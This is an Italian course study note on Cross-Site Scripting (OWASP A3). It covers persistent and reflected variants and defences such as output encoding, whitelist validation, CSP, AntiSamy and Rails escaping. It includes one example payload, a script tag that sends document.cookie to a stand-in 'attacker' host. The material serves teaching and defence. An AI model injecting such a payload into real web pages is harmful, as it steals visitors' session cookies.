---
title: Cross-Site Scripting
tags:
  - lab-architetture-software-sicurezza
  - concetto
  - sicurezza
  - owasp
  - xss
---

# Cross-Site Scripting

> [!summary] In breve
> OWASP A3: dati dell'attaccante inseriti senza codifica in una pagina vengono eseguiti come script nel browser di un altro utente (persistente se salvati, riflesso se nel link).

```html
<script>window.location='http://attacker/?cookie='+document.cookie</script>
```

| Tipo | Dove sta lo script | Chi colpisce |
|---|---|---|
| Persistente | database del sito | chiunque visiti la pagina |
| Riflesso | nel link/parametro | chi clicca il link |

Difese: **output encoding** per contesto (HTML element, attributo; mai dati non fidati in JS, CSS, URL), validazione white list, CSP, AntiSamy. Rails fa l'escaping in `<%= %>`; pericolosi `raw`/`html_safe`.

## Collegamenti

- **Concetti correlati**: [[Embedded Ruby ERB]] · [[Cross-Site Request Forgery]] · [[OWASP Top 10]]
- **Mappa**: [[MOC - Lab Architetture Software e Sicurezza]]

> [!info] Approfondimento
> - [[17 - LASS - Sicurezza delle Web Application#A3 – Cross-Site Scripting (XSS)|Lezione 17 — A3 – Cross-Site Scripting (XSS)]]
> - [[17 - LASS - Sicurezza delle Web Application#Evitare le falle XSS|Lezione 17 — Evitare le falle XSS]]
> - [[17 - LASS - Sicurezza delle Web Application#Schemi di escaping sicuri nei diversi contesti HTML|Lezione 17 — Schemi di escaping sicuri nei diversi contesti HTML]]
